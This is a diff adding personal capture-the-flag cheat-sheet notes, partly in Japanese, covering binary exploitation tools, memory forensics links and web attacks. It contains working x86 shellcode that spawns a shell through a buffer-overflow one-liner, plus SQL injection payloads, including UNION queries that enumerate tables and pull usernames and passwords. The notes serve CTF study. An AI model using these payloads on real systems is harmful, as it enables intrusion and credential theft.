@@ -1,0 +1,98 @@
+
+-----
+Pwn
+-----
+
+# stirngs
+# ltrace
+# strace
+# gdb
+
+  -> pwn file in local machine
+   # socat tcp-listen:1337,fork exec:"./binary"
+   # python ./solve_xxxx.py
+   # gdb -q -p 'pidof ./binary' -x cmd
+
+# checksec
+
+->list hex in binary
+# od -x binary |
+more
+
+-> list elf infomation of the file
+# readelf -a binary
+
+-> list Dynamic symbol informations
+# nm -D binary
+
+
+-> to change lib file from ordinary lib to custom lib
+  int rand(void) {
+    return atoi(getenv("RAND"));
+  }
+gcc -m32 -shared -o preload.so preload.c
+RAND=1 LD_PRELOAD=./preload.so ./E 1 3 p p.bin
+
+(echo -en '-1\n'; sleep 1; python -c 'print "\x90"*10+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x90"*203+"\xbc\xd4\xff\xff"')|./no_overflow
+
+
+"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+'\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80'
+
+
+-----
+Reverse
+-----
+
+# vol.py imageinfo -f bin_file
+#
+
+
+
+-----
+Web
+-----
+
+curl http://stackoverflow.com/  -A user-agent --proxy http://127.0.0.1:8080
+
+SQLInjection
+ ->
+
+・'を使わないインジェクション。　例えば SQL文がid=＄GET_{id}などで'がない場合に使用可能
+　　1 or 1=1 でインジェクション可能。ただし'がエスケープされるため、文の中に'を入れることができない
+　　http://stackoverflow.com/questions/110575/do-htmlspecialchars-and-mysql-real-escape-string-keep-my-php-code-safe-from-inje
+・文字コードのミスマッチをついてインジェクションする方法
+　　http://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string/12118602#12118602
+　　例として：
+　　　SET NAMES gbk　を行い　　縗' OR 1=1 # など
+
+今回は前者のケース。インジェクションを行うにあたり、今回のクエリが下記であり、
+　$query = "SELECT * FROM ${table_prefix}users WHERE id=$id";
+
+union文で結合しようにもTable名が${table_prefix}usersで、"10 UNION SELECT * FROM ${table_prefix}users WHERE id=1 limit 1"と指定しても
+${table_prefix}usersがちゃんと変換されないらしく、指定できない。
+
+そのため${table_prefix}usersが何かを探る必要がある。
+
+table名の取得には下記の情報から"SELECT table_schema,table_name FROM information_schema.tables"が使えそう
+http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+
+これをUNIONでくっつけて実施。テーブル数はSourceからid,username,password,email,location,display_nameがありidはint、その他はstring型と想定し、
+順番を前後したりしてためし、エラーなくできる形態が右記と判明　str,int,str,str,str,str,str
+
+10 union SELECT table_schema,1,table_name,table_name,table_name,table_name,table_name FROM information_schema.tables limit 1 offset 40
+
+10 UNION SELECT username,1,username,username,username,username,password FROM super_secret_users limit 1
+
+
+
+
+
+
+
+
+
+volatility
+
+https://books.google.co.jp/books?id=U1jOAwAAQBAJ&pg=PA340&lpg=PA340&dq=volatility+hosts+file&source=bl&ots=yhwCSDVWYo&sig=Or27HphK_IoBXkqyLD96WTXpjaw&hl=en&sa=X&ved=0ahUKEwibldi41enQAhULi7wKHRAkAqYQ6AEIOTAF#v=onepage&q=volatility%20hosts%20file&f=false
+https://volatility-labs.blogspot.jp/2012/09/howto-scan-for-internet-cachehistory.html
